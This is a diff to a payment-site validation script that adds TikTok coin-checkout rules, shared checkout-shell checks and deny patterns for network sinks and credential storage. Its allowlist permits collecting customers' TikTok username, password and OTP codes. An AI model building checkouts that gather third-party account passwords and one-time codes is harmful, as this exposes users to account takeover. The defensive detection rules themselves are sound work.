@@ -3,6 +3,7 @@ import { createHash } from 'node:crypto'
 import { access, readdir, readFile } from 'node:fs/promises'
 import path from 'node:path'
 import ts from 'typescript'
+import { commonPaymentPaths, validateCommonPaymentArchitecture, validateCardCheckout, validateSebPayForm, runPaymentSecuritySelfTests, allowReviewedPaymentCurrency } from './payment-security.mjs'
 
 const projectRoot = process.cwd()
 const requireOutput = process.argv.includes('--output')
@@ -17,6 +18,8 @@ const proxyOrigin = 'https://drava-leekpay.sebpay-proxy.workers.dev'
 const providerCheckoutApi = 'https://leekpay.fr/api/v1/checkout'
 const frontendAdapterPath = 'src/lib/leekpay.ts'
 const checkoutDialogPath = 'src/components/ui/dialog-checkout.tsx'
+const checkoutShellPath = 'src/components/ui/CheckoutShell.tsx'
+const checkoutProviderOptionPath = 'src/components/ui/CheckoutProviderOption.tsx'
 const customerDialogPath = 'src/components/ui/dialog-customer.tsx'
 const providerDialogPath = 'src/components/ui/dialog-providers.tsx'
 const usageNotesDialogPath = 'src/components/ui/dialog-notes.tsx'
@@ -25,6 +28,17 @@ const customerLocationPath = 'src/lib/customer-location.ts'
 const paymentResultPath = 'src/components/payment/PaymentResult.tsx'
 const paymentReceiptPath = 'src/components/payment/PaymentReceipt.tsx'
 const themeTogglePath = 'src/components/layout/ThemeToggle.tsx'
+const tiktokCatalogPath = 'src/components/catalog/TikTokPanel.tsx'
+const tiktokCheckoutPath = 'src/components/tiktok/TikTokCheckout.tsx'
+const tiktokHelpPath = 'src/components/tiktok/TikTokHelp.tsx'
+const tiktokHistoryPath = 'src/lib/tiktok-history.ts'
+const tiktokPaymentPath = 'src/lib/tiktok-payment.ts'
+const tiktokSupportPath = 'src/lib/tiktok-support.ts'
+const dravaContactPath = 'src/lib/drava-contact.ts'
+const tiktokSoundPath = 'src/lib/tiktok-sound.ts'
+const tiktokResultPath = 'src/components/tiktok/TikTokResult.tsx'
+const tiktokRoutePath = 'src/app/tiktok-payment/page.tsx'
+const tiktokVideoUrl = 'https://www.youtube.com/embed/AZgaA8ufCzs?autoplay=1&rel=0'
 const workerSourcePath = 'worker/src/index.ts'
 const workerConfigPath = 'worker/wrangler.jsonc'
 
@@ -32,6 +46,7 @@ const allowedRouteSources = new Set([
   'src/app/page.tsx',
   'src/app/payment-success/page.tsx',
   'src/app/payment-failure/page.tsx',
+  tiktokRoutePath,
 ])
 
 const forbiddenPageRoutes = [
@@ -54,6 +69,8 @@ const requiredPaths = [
   'src/app/payment-failure/page.tsx',
   'src/app/layout.tsx',
   checkoutDialogPath,
+  checkoutShellPath,
+  checkoutProviderOptionPath,
   customerDialogPath,
   usageNotesDialogPath,
   providerDialogPath,
@@ -62,6 +79,7 @@ const requiredPaths = [
   frontendAdapterPath,
   paymentCustomerPath,
   customerLocationPath,
+  dravaContactPath,
   workerSourcePath,
   workerConfigPath,
   'worker/package.json',
@@ -69,6 +87,11 @@ const requiredPaths = [
   'worker/tsconfig.json',
   'worker/test/worker.test.mjs',
   'worker/.dev.vars.example',
+  'public/sw.js',
+  'public/register-sw.js',
+  'public/pwa-install-capture.js',
+  'public/offline.html',
+  'scripts/generate-pwa.mjs',
 ]
 
 const forbiddenPaths = [
@@ -155,12 +178,27 @@ const forbiddenFrontendPatterns = [
 const forbiddenOutputPatterns = [
   // Next's reviewed framework runtime contains this generic DOM primitive. The
   // first-party source scan above remains authoritative for custom injection sinks.
-  ...forbiddenFrontendPatterns.filter(({ label }) => label !== 'HTML injection sink'),
+  // The reviewed TikTok modules name SoleasPay and build only a public support
+  // link. Their source checks below reject provider APIs and private handoffs.
+  ...forbiddenFrontendPatterns.filter(({ label }) => !['HTML injection sink', 'Soleas integration', 'WhatsApp personal-data handoff'].includes(label)),
   { label: 'sensitive NEXT_PUBLIC credential reference', pattern: publicCredentialReferencePattern },
   { label: 'card-data collection field', pattern: /\bcard_number\b|cardNumberPlaceholder|cvvPlaceholder/i },
   { label: 'withdrawal state', pattern: /withdrawalData|withdrawalHistory|dravaCards/i },
   { label: 'source map reference', pattern: /sourceMappingURL\s*=\s*[^\s]+\.map/i },
 ]
+
+// jsPDF 4.2.1 includes optional PDF viewer windows which create two iframes.
+// DRAVA uses only its programmatic PDF/save API. This digest identifies the
+// exact reviewed dependency chunk; any dependency/build change fails closed.
+// This exception never applies to first-party source, HTML or other rules.
+const reviewedPdfRuntimeHashes = new Set([
+  'e975167cc96bb41247141ab5984638df1f5e5da4da02aedbf752f91cab05fd6d',
+])
+
+function isReviewedPdfIframeRuntime(source, relativePath, reviewedHashes = reviewedPdfRuntimeHashes) {
+  return /^out\/_next\/static\/chunks\/[^/]+\.js$/.test(relativePath)
+    && reviewedHashes.has(createHash('sha256').update(source).digest('hex'))
+}
 
 async function listFiles(directory, extensions, ignored = new Set()) {
   let entries
@@ -273,13 +311,166 @@ function validateFrontendUrls(source, relativePath, productionBundle = false) {
     if (/leekpay\.(?:fr|me)/i.test(url)) {
       failures.push(`Provider URL must not be bundled in the browser: ${relativePath} (${url})`)
     }
+    if (/(?:^https?:\/\/)(?:pay\.)?soleaspay\.com|newapi\.sebpay\.bj|api\.emailjs\.com/i.test(url)) {
+      failures.push(`TikTok provider or fulfillment API must stay server-side: ${relativePath} (${url})`)
+    }
     if (/workers\.dev/i.test(url)) {
-      const sourceAllowed = relativePath === frontendAdapterPath || relativePath === 'src/app/layout.tsx'
+      const sourceAllowed = relativePath === 'src/lib/payment-api.ts' || relativePath === 'src/app/layout.tsx'
       if (url !== proxyOrigin || (!productionBundle && !sourceAllowed)) {
         failures.push(`Unapproved payment proxy URL: ${relativePath} (${url})`)
       }
     }
   }
+  return failures
+}
+
+function allowReviewedTikTokRule(source, relativePath, label) {
+  if (label === 'legacy XAF currency') return relativePath === 'src/lib/payment-api.ts' && allowReviewedPaymentCurrency(source)
+  if (label === 'Soleas integration') return [tiktokPaymentPath, tiktokHistoryPath, 'src/lib/payment-providers.ts'].includes(relativePath)
+  if (label === 'WhatsApp personal-data handoff') return relativePath === dravaContactPath
+    ? validateDravaContact(source).length === 0
+    : relativePath === tiktokSupportPath && validateTikTokSupport(source).length === 0
+  if (label === 'payment iframe') return relativePath === tiktokHelpPath
+  return false
+}
+
+function validateDravaContact(source) {
+  const failures = []
+  const file = ts.createSourceFile(dravaContactPath, source, ts.ScriptTarget.Latest, true, ts.ScriptKind.TS)
+  const variables = file.statements.flatMap(statement => ts.isVariableStatement(statement) ? [...statement.declarationList.declarations] : [])
+  const variable = name => variables.find(node => ts.isIdentifier(node.name) && node.name.text === name)
+  const phone = variable('phoneNumber')?.initializer
+  const whatsapp = variable('whatsappNumber')?.initializer
+  const contact = variable('DRAVA_CONTACT')?.initializer
+  const object = contact && ts.isCallExpression(contact) && contact.expression.getText(file) === 'Object.freeze' && contact.arguments.length === 1 ? contact.arguments[0] : null
+  if (file.statements.length !== 3 || variables.length !== 3 || !phone || !ts.isStringLiteral(phone) || phone.text !== '+237692426620'
+    || compact(whatsapp?.getText(file) ?? '') !== 'phoneNumber.slice(1)') failures.push('DRAVA contact must derive only the fixed public +237692426620 number')
+  const expected = new Map([
+    ['phoneNumber', 'phoneNumber'], ['whatsappNumber', 'whatsappNumber'],
+    ['displayPhone', '`${phoneNumber.slice(0,4)}${phoneNumber.slice(4,7)}${phoneNumber.slice(7,10)}${phoneNumber.slice(10)}`'],
+    ['phoneHref', '`tel:${phoneNumber}`'], ['whatsappHref', '`https://wa.me/${whatsappNumber}`'],
+  ])
+  if (!object || !ts.isObjectLiteralExpression(object) || object.properties.length !== expected.size || new Set(object.properties.map(property => property.name?.getText(file))).size !== expected.size || object.properties.some(property => {
+    if (!ts.isPropertyAssignment(property) && !ts.isShorthandPropertyAssignment(property)) return true
+    const name = property.name.getText(file)
+    const value = ts.isPropertyAssignment(property) ? property.initializer.getText(file) : name
+    return !expected.has(name) || compact(value) !== expected.get(name)
+  })) failures.push('DRAVA contact must be frozen public display/tel/WhatsApp metadata with no message or additional data')
+  return failures
+}
+
+function validateTikTokSupport(source) {
+  const failures = []
+  const file = ts.createSourceFile(tiktokSupportPath, source, ts.ScriptTarget.Latest, true, ts.ScriptKind.TS)
+  const imports = file.statements.filter(ts.isImportDeclaration)
+  const variables = file.statements.flatMap(statement => ts.isVariableStatement(statement) ? [...statement.declarationList.declarations] : [])
+  if (imports.length !== 1 || imports[0].moduleSpecifier.getText(file) !== '"./drava-contact.ts"'
+    || compact(imports[0].importClause?.getText(file) ?? '') !== '{DRAVA_CONTACT}') failures.push('TikTok support must import its public contact only from drava-contact')
+  let contacts = variables.find(node => ts.isIdentifier(node.name) && node.name.text === 'SUPPORT_WHATSAPP_CONTACTS')?.initializer
+  while (contacts && (ts.isAsExpression(contacts) || ts.isSatisfiesExpression(contacts))) contacts = contacts.expression
+  const contact = contacts && ts.isArrayLiteralExpression(contacts) && contacts.elements.length === 1 ? contacts.elements[0] : null
+  const fields = new Map([['whatsappNumber','DRAVA_CONTACT.whatsappNumber'],['phoneNumber','DRAVA_CONTACT.phoneNumber'],['displayPhone','DRAVA_CONTACT.displayPhone']])
+  if (variables.length !== 1 || !contact || !ts.isObjectLiteralExpression(contact) || contact.properties.length !== 5 || new Set(contact.properties.map(property => property.name?.getText(file))).size !== 5
+    || contact.properties.some(property => {
+      if (!ts.isPropertyAssignment(property) || !ts.isIdentifier(property.name)) return true
+      const key = property.name.text, value = property.initializer
+      if (fields.has(key)) return compact(value.getText(file)) !== fields.get(key)
+      if (key === 'id') return !ts.isStringLiteral(value) || value.text !== 'drava'
+      if (key === 'label') return !ts.isObjectLiteralExpression(value) || value.properties.length !== 2 || value.properties.some(label => !ts.isPropertyAssignment(label) || !['fr','en'].includes(label.name.getText(file)) || !ts.isStringLiteral(label.initializer))
+      return true
+    })) failures.push('TikTok support must expose one DRAVA contact with literal bilingual labels and centralized number fields')
+  const helper = file.statements.find(node => ts.isFunctionDeclaration(node) && node.name?.text === 'buildSupportWhatsAppHref')
+  const condensed = helper ? compact(ts.createPrinter({ removeComments: true }).printNode(ts.EmitHint.Unspecified,helper,file)) : ''
+  if (!helper?.body || helper.body.statements.length !== 4 || helper.parameters.length !== 2
+    || helper.parameters.some((parameter,index) => parameter.name.getText(file) !== ['whatsappNumber','message'][index] || parameter.type?.kind !== ts.SyntaxKind.StringKeyword || parameter.initializer)
+    || !condensed.includes('constnormalizedNumber=whatsappNumber.replace(/\\D/g,"")')
+    || !condensed.includes('constbaseHref=`https://wa.me/${normalizedNumber}`')
+    || !condensed.includes('constnormalizedMessage=message?.trim()')
+    || !condensed.includes('returnnormalizedMessage?`${baseHref}?text=${encodeURIComponent(normalizedMessage)}`:baseHref')) failures.push('TikTok WhatsApp helper must normalize the public number and encode only the explicit public support message')
+  const forbidden = new Set(['customer','password','otp','otpCode','orderToken','sessionStorage','localStorage','indexedDB','fetch','XMLHttpRequest','WebSocket','sendBeacon','window','document','navigator'])
+  const visit = node => { if (ts.isIdentifier(node) && forbidden.has(node.text)) failures.push('TikTok support must not use private customer data, browser state or network side effects'); ts.forEachChild(node,visit) }
+  visit(file)
+  if (file.statements.some(node => !ts.isImportDeclaration(node) && !ts.isTypeAliasDeclaration(node) && !ts.isVariableStatement(node) && node !== helper)) failures.push('TikTok support must contain only its public contact types/list and pure link helper')
+  return failures
+}
+
+function jsxAttribute(element, name) {
+  return element.attributes.properties.find((attribute) => ts.isJsxAttribute(attribute) && attribute.name.getText() === name)?.initializer
+}
+
+function validateTikTokControls(source, relativePath) {
+  const failures = []
+  const file = ts.createSourceFile(relativePath, source, ts.ScriptTarget.Latest, true, ts.ScriptKind.TSX)
+  const controls = []
+  const visit = (node) => {
+    const element = getJsxOpeningElement(node)
+    if (element && ['input', 'select', 'textarea', 'form'].includes(element.tagName.getText())) controls.push(element)
+    ts.forEachChild(node, visit)
+  }
+  visit(file)
+  const expression = (element, name) => compact(jsxAttribute(element, name)?.getText(file) ?? '')
+  if (relativePath === tiktokCatalogPath) {
+    if (controls.length !== 1 || controls[0].tagName.getText() !== 'input'
+      || expression(controls[0], 'inputMode') !== '"numeric"'
+      || expression(controls[0], 'value') !== '{customCoins||""}'
+      || !expression(controls[0], 'onChange').includes('normalizeCustomCoins(event.target.value)')) {
+      failures.push('TikTok catalogue may collect only the normalized custom coin quantity')
+    }
+    return failures
+  }
+  const values = new Set(['{username}', '{password}', '{whatsapp}', '{email}', '{id}', '{otp}', '{selected&&phone.startsWith(selected.prefix)?phone.slice(selected.prefix.length):phone}'])
+  for (const element of controls) {
+    const tag = element.tagName.getText()
+    if (element.attributes.properties.some(ts.isJsxSpreadAttribute)) failures.push('TikTok controls must not spread unknown attributes')
+    if (tag === 'textarea') failures.push('TikTok checkout must not collect arbitrary free-form data')
+    if (tag === 'form' && (jsxAttribute(element, 'action') || expression(element, 'onSubmit') !== '{submitForm}')) failures.push('TikTok forms must use the reviewed SebPay submit handler without a native action')
+    if (tag === 'select' && !['{countryCode}', '{country}', '{operator}'].includes(expression(element, 'value'))) failures.push('TikTok selectors may choose only a country or payment operator')
+    if (tag === 'input') {
+      const type = expression(element, 'type')
+      const value = expression(element, 'value')
+      const consent = type === '"checkbox"' && expression(element, 'checked') === '{accepted}' && !value
+      if (!consent && !values.has(value)) failures.push('TikTok input is outside the username/password/contact/OTP/provider allowlist')
+      if (value === '{password}' && (expression(element, 'autoComplete') !== '"off"' || type !== '{showPassword?"text":"password"}')) failures.push('TikTok password input must retain its explicit visibility control and disable autofill')
+    }
+  }
+  return failures
+}
+
+function validateTikTokSource(source, relativePath) {
+  const failures = []
+  if (!/tiktok/i.test(relativePath)) return failures
+  if (![tiktokHistoryPath, tiktokSoundPath].includes(relativePath) && /\b(?:localStorage|sessionStorage|indexedDB|caches)\b/.test(source)) failures.push(`TikTok credentials and capabilities must remain outside browser storage: ${relativePath}`)
+  if (/\bemailjs\s*\.|@emailjs\/browser|\b(?:apiKey|secretKey)\s*[:=]/i.test(source)) failures.push(`TikTok credentials and order delivery must remain server-side: ${relativePath}`)
+  if (/history\.(?:pushState|replaceState)\([^\n]*(?:password|customer|whatsapp|email|otpCode|orderToken)/i.test(source)) failures.push(`TikTok private data must not enter browser history: ${relativePath}`)
+  if (relativePath === tiktokHelpPath) {
+    const file = ts.createSourceFile(relativePath, source, ts.ScriptTarget.Latest, true, ts.ScriptKind.TSX)
+    const frames = []
+    const visit = (node) => { const element = getJsxOpeningElement(node); if (element?.tagName.getText() === 'iframe') frames.push(element); ts.forEachChild(node, visit) }
+    visit(file)
+    const src = frames.length === 1 ? jsxAttribute(frames[0], 'src') : null
+    if (!src || !ts.isStringLiteral(src) || src.text !== tiktokVideoUrl
+      || frames[0].attributes.properties.some(ts.isJsxSpreadAttribute)
+      || /document\.createElement\(\s*["']iframe["']/.test(source)) failures.push('TikTok help may embed only the original public YouTube tutorial with a static URL')
+  }
+  if (relativePath === tiktokSupportPath) {
+    failures.push(...validateTikTokSupport(source))
+  }
+  if (relativePath === tiktokHistoryPath) {
+    const file = ts.createSourceFile(relativePath, source, ts.ScriptTarget.Latest, true, ts.ScriptKind.TS)
+    const sanitize = file.statements.find((node) => ts.isFunctionDeclaration(node) && node.name?.text === 'publicTikTokOrder')
+    const returns = sanitize?.body?.statements.filter(ts.isReturnStatement) ?? []
+    const object = returns.find((node) => node.expression && ts.isObjectLiteralExpression(node.expression))?.expression
+    const safeFields = ['orderId', 'packId', 'provider', 'status', 'verified', 'coins', 'bonus', 'amount', 'currency', 'createdAt', 'notification']
+    if (!object || object.properties.some((property) => !ts.isPropertyAssignment(property))
+      || JSON.stringify(object.properties.map((property) => property.name.getText(file)).sort()) !== JSON.stringify(safeFields.sort())
+      || !/const order = publicTikTokOrder\(value\)/.test(source)
+      || !/const KEY = "drava-tiktok-history"/.test(source)) failures.push('TikTok history must store only explicitly sanitized public receipt fields')
+  }
+  if (relativePath === tiktokSoundPath && (!/SOUND_PREFERENCE_KEY = "drava-tiktok-sound-enabled"/.test(source)
+    || /\b(?:password|customer|email|whatsapp|orderToken|otpCode)\b/.test(source))) failures.push('TikTok sound storage must contain only the sound preference')
+  if (relativePath === tiktokResultPath && (!/getTikTokOrderStatus\(\s*orderToken,\s*controller\.signal,?\s*\)/.test(source)
+    || !/order\?\.status === "paid" && order\.verified/.test(source)
+    || !/window\.history\.replaceState\(null,\s*"",\s*window\.location\.pathname\)/.test(source))) failures.push('TikTok results must verify server status and remove the return capability from the URL')
   return failures
 }
 
@@ -357,8 +548,12 @@ function validateUsageNotesButtons(source, fileName) {
 
   const failures = []
   if (buttons.length !== 2) failures.push(`Usage-notes dialog must contain exactly two Button controls (found ${buttons.length})`)
-  for (const [index, { node, openingElement }] of buttons.entries()) {
-    const label = index === 0 ? 'Usage-notes accept button' : 'Usage-notes decline button'
+  const actionCounts = { onAccept: 0, onClose: 0 }
+  for (const { node, openingElement } of buttons) {
+    const visibleText = ts.isJsxElement(node) ? node.children.map((child) => child.getText(sourceFile)).join(' ') : ''
+    const expectedHandler = /Refuser|Decline/.test(visibleText) ? 'onClose' : /Accept|Accepter/.test(visibleText) ? 'onAccept' : null
+    const label = expectedHandler === 'onClose' ? 'Usage-notes decline button' : 'Usage-notes accept button'
+    if (expectedHandler) actionCounts[expectedHandler] += 1
     const attributes = openingElement.attributes.properties
     if (attributes.some(ts.isJsxSpreadAttribute)) failures.push(`${label} must not use spread attributes`)
     const jsxAttributes = attributes.filter(ts.isJsxAttribute)
@@ -366,7 +561,6 @@ function validateUsageNotesButtons(source, fileName) {
     if (names.includes('disabled')) failures.push(`${label} must remain active`)
     const clicks = jsxAttributes.filter((attribute) => attribute.name.getText() === 'onClick')
     if (clicks.length !== 1) failures.push(`${label} must have exactly one onClick handler`)
-    const expectedHandler = index === 0 ? 'onAccept' : 'onClose'
     const clickInitializer = clicks[0]?.initializer
     const clickExpression = clickInitializer && ts.isJsxExpression(clickInitializer) ? clickInitializer.expression : undefined
     if (!clickExpression || !ts.isIdentifier(clickExpression) || clickExpression.text !== expectedHandler) {
@@ -382,6 +576,7 @@ function validateUsageNotesButtons(source, fileName) {
       failures.push(`${label} must not be nested in or contain an interactive wrapper`)
     }
   }
+  if (actionCounts.onAccept !== 1 || actionCounts.onClose !== 1) failures.push('Usage notes must expose one clearly labelled accept action and one decline action')
   if (!/Refuser/.test(source) || !/Decline/.test(source)) failures.push('Usage-notes decline labels must remain Refuser/Decline')
   return failures
 }
@@ -704,7 +899,25 @@ function validateThemeToggleControl(source) {
 
 function validateDataCollectionControls(source, relativePath) {
   if (relativePath === themeTogglePath) return validateThemeToggleControl(source)
-  if (relativePath !== customerDialogPath && /<(?:form|input|select|textarea)\b|\bcontentEditable\b/i.test(source)) {
+  if (relativePath === 'src/components/payment/SebPayForm.tsx') return validateSebPayForm(source)
+  if ([tiktokCatalogPath, tiktokCheckoutPath].includes(relativePath)) return validateTikTokControls(source, relativePath)
+  let controlsSource = source
+  if (['src/components/pwa/usePwaPageAvailable.ts', 'public/register-sw.js'].includes(relativePath)) {
+    // These exact matches() arguments only detect a focused editable element;
+    // they do not enable editing or read its value. Keep all other controls checked.
+    const file = ts.createSourceFile(relativePath, source, ts.ScriptTarget.Latest, true, ts.ScriptKind.TS)
+    const spans = []
+    const approved = new Set(['input, select, textarea, [contenteditable="true"]', 'input, textarea, select, [contenteditable="true"]'])
+    function visit(node) {
+      if (ts.isCallExpression(node) && ts.isPropertyAccessExpression(node.expression)
+        && node.expression.name.text === 'matches' && node.arguments.length === 1
+        && ts.isStringLiteral(node.arguments[0]) && approved.has(node.arguments[0].text)) spans.push([node.arguments[0].getStart(file), node.arguments[0].end])
+      ts.forEachChild(node, visit)
+    }
+    visit(file)
+    for (const [start, end] of spans.sort((a, b) => b[0] - a[0])) controlsSource = `${controlsSource.slice(0, start)}"focused-field-selector"${controlsSource.slice(end)}`
+  }
+  if (relativePath !== customerDialogPath && /<(?:form|input|select|textarea)\b|\bcontentEditable\b/i.test(controlsSource)) {
     return [`Data-collection controls are allowed only in ${customerDialogPath}: ${relativePath}`]
   }
   return []
@@ -722,6 +935,8 @@ function validateProviderDialog(source) {
   if (!/createLeekPayCheckout\(\s*card\.id,\s*customer,\s*controller\.signal,?\s*\)/.test(source)) failures.push('Provider dialog must send only the selected product and canonical customer')
   if (!/window\.location\.assign\(checkout\.checkoutUrl\)/.test(source)) failures.push('Provider dialog must navigate only to the validated checkout URL')
   if (!/\bLeekPay\b/.test(source)) failures.push('Provider dialog must identify LeekPay')
+  if (!/from\s*["']@\/components\/ui\/CheckoutProviderOption["']/.test(source)
+    || countOpeningTags(source, 'CheckoutProviderOption') !== 1) failures.push('Card providers must use the same shared provider selection tile as TikTok')
   if (!/window\.addEventListener\(["']pageshow["']/.test(source)
     || !/window\.removeEventListener\(["']pageshow["']/.test(source)
     || !/requestRef\.current\?\.abort\(\)/.test(source)
@@ -742,6 +957,93 @@ function validateProviderDialog(source) {
   return failures
 }
 
+function validateSharedCheckoutController(source) {
+  const failures = []
+  const condensed = compact(source)
+  if (!/from["']@\/components\/ui\/CheckoutShell["']/.test(condensed)
+    || countOpeningTags(source, 'CheckoutShell') !== 1 || countOpeningTags(source, 'CheckoutPanel') !== 1
+    || /DialogPrimitive\.(?:Root|Portal|Overlay|Content)|function\s+(?:CheckoutPanel|StepPanel)\b/.test(source)) {
+    failures.push('Every product must use the single shared checkout shell and panel, without nested dialogs')
+  }
+  if (!/<CheckoutShellopen=\{isOpen\}onClose=\{onClose\}onExitComplete=\{finishClose\}/.test(condensed)
+    || !/reducedMotion=\{reducedMotion\}/.test(condensed)
+    || !/contentRef=\{setDialogElement\}/.test(condensed)
+    || !/<AnimatePresenceinitial=\{false\}(?:mode=["']sync["'])?>\{isOpen&&\(?<CheckoutPanel/.test(condensed)
+    || !/<CheckoutPanelkey=\{step\}reducedMotion=\{reducedMotion\}/.test(condensed)
+    || (source.match(/key=\{step\}/g)?.length ?? 0) !== 1) {
+    failures.push('Product controllers must delegate guarded closure and keyed crossfading panels to the shared checkout')
+  }
+  return failures
+}
+
+function validateCheckoutShell(source) {
+  const failures = []
+  const condensed = compact(source)
+  for (const primitive of ['Root', 'Portal', 'Overlay', 'Content', 'Title', 'Description']) {
+    const count = countOpeningTags(source, `DialogPrimitive.${primitive}`)
+    if (count !== 1) failures.push(`Shared checkout must contain exactly one accessible Radix ${primitive} (found ${count})`)
+  }
+  if (!/<DialogPrimitive\.Rootopen=\{open\}onOpenChange=\{\(next\)=>\{if\(!next&&canDismiss\)onClose\(\);?\}\}/.test(condensed)
+    || !/onOpenAutoFocus=\{onOpenAutoFocus\}onCloseAutoFocus=\{onCloseAutoFocus\}/.test(condensed)
+    || !/onEscapeKeyDown=\{\(event\)=>\{if\(!canDismiss\)event\.preventDefault\(\);?\}\}/.test(condensed)
+    || !/onInteractOutside=\{\(event\)=>\{if\(!canDismiss\)event\.preventDefault\(\);?\}\}/.test(condensed)
+    || (source.match(/disabled=\{!canDismiss\}/g)?.length ?? 0) !== 2) {
+    failures.push('Shared checkout must delegate focus and prevent every dismissal control while dismissal is disabled')
+  }
+  if (!/<DialogPrimitive\.ContentasChild/.test(condensed)
+    || !/data-checkout-shell=["']shared["']/.test(condensed)
+    || !/layout=\{reducedMotion\?false:["']size["']\}/.test(condensed)
+    || !/if\(event\.target===event\.currentTarget&&!open&&\(event\.animationName===["']checkout-dialog-exit["']\|\|event\.animationName===["']checkout-mobile-exit["']\)\)\{?onExitComplete\(\)/.test(condensed)) {
+    failures.push('Shared checkout must preserve reduced-motion layout and finish only its own recognized closing animation')
+  }
+  if (!/constisPresent=useIsPresent\(\)/.test(condensed)
+    || !/constpanelRef=useRef<HTMLDivElement>\(null\)/.test(condensed)
+    || !/useLayoutEffect\(\(\)=>\{if\(panelRef\.current\)panelRef\.current\.inert=!isPresent;?\},\[isPresent\]\)/.test(condensed)
+    || !/aria-hidden=\{!isPresent\|\|undefined\}/.test(condensed)
+    || !/ref=\{panelRef\}/.test(condensed)
+    || !/if\(scroller&&scrollTop!==undefined\)scroller\.scrollTop=scrollTop/.test(condensed)
+    || !/onScrollCapture=\{\(event\)=>\{if\(isPresent&&event\.targetinstanceofHTMLElement&&event\.target\.matches\("\.checkout-scroll"\)\)\{onScrollTopChange\?\.\(event\.target\.scrollTop\);?\}\}\}/.test(condensed)
+    || !/duration:reducedMotion\?0:0\.18/.test(condensed)) {
+    failures.push('Shared panels must preserve scroll only from their active checkout scroller; exiting panels remain inert, hidden and reduced-motion aware')
+  }
+  if (/\b(?:fetch|XMLHttpRequest|WebSocket|localStorage|sessionStorage|indexedDB|customer|email|whatsapp|password|orderToken|createLeekPayCheckout|createTikTokCheckout)\b|<(?:form|input|select|textarea)\b|\bcontentEditable\b/.test(source)) {
+    failures.push('Shared checkout presentation must not collect, persist or submit product/payment data')
+  }
+  return failures
+}
+
+function validateCheckoutProviderOption(source) {
+  const failures = []
+  const condensed = compact(source)
+  if (!hasExactInterfaceProperties(source, 'CheckoutProviderOptionProps', ['id', 'name', 'selected', 'disabled', 'recommended', 'unavailable', 'onSelect', 'logoSrc', 'logoClassName'])
+    || countOpeningTags(source, 'button') !== 1
+    || !/<buttontype=["']button["']/.test(condensed)
+    || !/aria-pressed=\{selected\}disabled=\{disabled\|\|unavailable\}onClick=\{onSelect\}/.test(condensed)
+    || !/alt=["']["']/.test(source)) failures.push('Shared provider tile must expose only its native selected/disabled selection control and decorative logo')
+  if (/\b(?:fetch|XMLHttpRequest|WebSocket|localStorage|sessionStorage|indexedDB|window|document|customer|email|whatsapp|password|orderToken|handleCheckout|createLeekPayCheckout|createTikTokCheckout)\b|<(?:form|input|select|textarea)\b|\bcontentEditable\b/.test(source)) {
+    failures.push('Shared provider tile must never collect data, own dialog lifecycle or initiate a payment')
+  }
+  const file = ts.createSourceFile(checkoutProviderOptionPath, source, ts.ScriptTarget.Latest, true, ts.ScriptKind.TSX)
+  const visit = (node) => {
+    const opening = getJsxOpeningElement(node)
+    if (opening) {
+      const tag = opening.tagName.getText(file)
+      if (!['button', 'span', 'img', 'strong', 'small'].includes(tag)) failures.push('Provider tile must contain only its selection button and static visual elements')
+      for (const attribute of opening.attributes.properties) {
+        if (ts.isJsxSpreadAttribute(attribute)) failures.push('Provider tile must not spread unknown behavior')
+        if (ts.isJsxAttribute(attribute)) {
+          const name = attribute.name.getText(file)
+          if (['href', 'action', 'formAction', 'asChild'].includes(name)
+            || (isActivationHandlerName(name) && !(tag === 'button' && name === 'onClick'))) failures.push('Provider tile must not contain secondary navigation or activation handlers')
+        }
+      }
+    }
+    ts.forEachChild(node, visit)
+  }
+  visit(file)
+  return failures
+}
+
 function validateCheckoutDialog(source) {
   const failures = []
   const condensed = compact(source)
@@ -754,13 +1056,7 @@ function validateCheckoutDialog(source) {
     || !/useState<CheckoutStep>\(["']notes["']\)/.test(condensed)) failures.push('Checkout dialog must start at usage notes')
   if (!/useState<PaymentCustomer>\(\{email:["']["'],whatsapp:["']["'],?\}\)/.test(condensed)
     || !/constvalidCustomer=normalizePaymentCustomer\(customer\)/.test(condensed)) failures.push('Checkout dialog must keep a controlled customer draft and canonical value')
-  for (const primitive of ['Root', 'Portal', 'Overlay', 'Content']) {
-    const count = countOpeningTags(source, `DialogPrimitive.${primitive}`)
-    if (count !== 1) failures.push(`Checkout dialog must contain exactly one Radix ${primitive} (found ${count})`)
-  }
-  if (countOpeningTags(source, 'DialogPrimitive.Description') !== 1) failures.push('Checkout dialog must own one persistent accessible description')
-  if (!/<DialogPrimitive\.Rootopen(?:=\{isOpen\})?onOpenChange=/.test(condensed)) failures.push('Checkout dialog must open its single Radix root, optionally controlled by its local close animation')
-  if (!/onOpenChange=\{\(open\)=>\{if\(!open\)onClose\(\);?\}\}/.test(condensed)) failures.push('Checkout dialog dismiss must call onClose')
+  failures.push(...validateSharedCheckoutController(source))
   if (!/<UsageNotesonAccept=\{\(\)=>\{setStep\(["']customer["']\);setLocationRequested\(true\);?\}\}onClose=\{onClose\}\/>/.test(condensed)) {
     failures.push('Usage-notes acceptance must advance to customer details and enable one location lookup')
   }
@@ -800,7 +1096,7 @@ function validateCheckoutDialog(source) {
     || /\bconsole\.(?:log|info|warn|error|debug)\s*\(/.test(source)) {
     failures.push('Checkout location prefilling must not use GPS, persistence or logs')
   }
-  if (/\b(?:onExitComplete|notes-exiting|checkoutStep|DialogNotes|DialogProviders)\b/.test(source)) failures.push('Checkout wrapper must not restore the previous multi-dialog lifecycle')
+  if (/\b(?:notes-exiting|checkoutStep|DialogNotes|DialogProviders)\b/.test(source)) failures.push('Checkout wrapper must not restore the previous multi-dialog lifecycle')
   // Local presence state is permitted only for the unified, guarded close path.
   // In particular, removing the live panel must begin immediately so its
   // useIsPresent effects can abort payment before the dialog fade completes.
@@ -808,8 +1104,8 @@ function validateCheckoutDialog(source) {
   if (/\bisOpen\b/.test(source) || closeAlias) {
     if (!closeAlias
       || !/const\[isOpen,setIsOpen\]=useState\(true\)/.test(condensed)
-      || !/<DialogPrimitive\.Rootopen=\{isOpen\}onOpenChange=/.test(condensed)
-      || !/<AnimatePresenceinitial=\{false\}mode=["']wait["']>\{isOpen&&\(?<CheckoutPanel/.test(condensed)
+      || !/<CheckoutShellopen=\{isOpen\}onClose=\{onClose\}/.test(condensed)
+      || !/<AnimatePresenceinitial=\{false\}mode=["']sync["']>\{isOpen&&\(?<CheckoutPanel/.test(condensed)
       || !/useLayoutEffect\(\(\)=>\{if\(dialogElement\)dialogElement\.inert=!isOpen;?\},\[dialogElement,isOpen\]\)/.test(condensed)) {
       failures.push('Animated checkout must control one root and immediately remove/inert its live panel when closing')
     }
@@ -827,21 +1123,16 @@ function validateCheckoutDialog(source) {
     if (!timeout || Number(timeout[1]) < 1 || Number(timeout[1]) > 300
